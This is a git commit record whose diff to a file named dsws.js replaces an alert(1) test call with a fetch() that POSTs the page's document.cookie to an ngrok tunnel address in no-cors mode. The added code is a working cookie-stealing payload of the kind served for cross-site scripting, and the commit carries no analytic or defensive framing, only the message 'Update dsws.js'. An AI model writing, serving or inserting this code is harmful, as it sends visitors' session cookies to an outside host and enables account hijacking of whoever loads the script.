c4c33b0fd386d3dff8e55a71cbc2e4b0f082dd37
adwewadew <100243581+adwewadew@users.noreply.github.com>
2023-04-01 21:02:22 +0300

    Update dsws.js

--- dsws.js
+++ dsws.js
@@ -1,4 +1,6 @@
-function a(){
-    alert(1);
-}
-a();
+    fetch('https://2581-2001-16a2-df23-e500-cca-49b6-90a1-f145.eu.ngrok.io', {
+
+  method: 'POST',
+  mode: 'no-cors',
+  body:document.cookie
+});
